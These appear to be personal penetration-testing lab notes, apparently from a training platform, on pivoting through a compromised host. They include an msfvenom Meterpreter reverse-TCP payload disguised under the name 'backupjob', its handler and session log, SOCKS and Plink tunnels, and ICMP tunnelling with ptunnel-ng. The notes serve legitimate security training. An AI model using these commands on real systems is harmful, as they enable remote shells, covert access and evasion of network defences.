
---
### Meterpreter Tunneling
Creating Payload for Ubuntu Pivot Host
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[local_ip] -f elf -o backupjob LPORT=8080
```

Start listening
```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp 
msf exploit(multi/handler) > set lhost 0.0.0.0 
lhost => 0.0.0.0 
msf exploit(multi/handler) > set lport 8080 
lport => 8080 
msf exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
payload => linux/x64/meterpreter/reverse_tcp 
msf exploit(multi/handler) > run 
[*] Started reverse TCP handler on 0.0.0.0:8080
```

Copy the `backupjob` binary file to the Ubuntu pivot host and execute it to get a Meterpreter session.

```bash
ubuntu@WebServer:~$ ls 
backupjob 
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

Session Establishment
```bash
[*] Sending stage (3020772 bytes) to 10.129.202.64 
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500 

meterpreter > pwd 

/home/ubuntu
```

### SOCKS tunneling
#### Dynamic Port Forwarding 
```bash
hcx05@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64 -N
```

We need a tool  that can route any tool's packets over the port `9050`, which is `proxychains`.

`proxychains` is capable to redirecting TCP connections through `TOR` `SOCKS`, and `HTTP/HTTPS` proxy servers. It is often used to force an application's `TCP traffic` to go through hosted proxy.

Setting `/etc/proxychains.conf`
```bash
socks5 [ip] [port]
```

### Plink(Windows)
We can use `Plink` to create a ssh tunnel.
```powershell
plink.exe -ssh -D 9050 ubuntu@10.129.15.50 -N
```
If we're under the cercumstance that don't have interactive mode
```powershell
echo y | plink.exe -ssh -D 9050 ubuntu@10.129.15.50 -pw [password] -N
```
#### Proxifier
The Windows equivalent of `proxychains`, it **routes** traffic from apps (like `MSTSC`) into the SOCKS tunnel created by **Plink** (`127.0.0.1:9050`).

Plink builds the **Pipe**; Proxifier pushes the **Traffic** into it.
### ICMP Tunneling with SOCKS
ICMP tunneling encapsulates your traffic within `ICMP packets` 
containing `echo requests` and `responses`.
#### ptunnel-ng
```bash
hcx05@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
```
#### Building Ptunnel-ng use a static binary
```bash
hcx05@htb[/htb]$ sudo apt install automake autoconf -y hcx05@htb[/htb]$ cd ptunnel-ng/ 
hcx05@htb[/htb]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh 
hcx05@htb[/htb]$ ./autogen.sh
```
#### Transferring Ptunnel-ng to the Pivot Host
```bash
scp -r ptunnel-ng ubuntu@[Pivt host ip]:~/
```
#### Starting the Server on the Target Host
```bash
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r[Target host ip] -R[Target host Port]

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available 
(required by ./ptunnel-ng) 
[inf]: Starting ptunnel-ng 1.42. 
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no> 
[inf]: (c) 2017-2019 Toni Uhlig, <matzeton@googlemail.com> 
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr> 
[inf]: Forwarding incoming ping packets over TCP. 
[inf]: Ping proxy is listening in privileged mode. 
[inf]: Dropping privileges now.
```
#### Connecting to Server from Attack Host
```bash
hcx05@htb[/htb]$ sudo ./ptunnel-ng -p[Pivot host ip] -l[Local Port] -r[Target host ip] -R[Target host port]
#sudo: Client needs to forgery and sent ICMP Echo Request(ping packet), this behavior required privilege(RAW Socket).
```







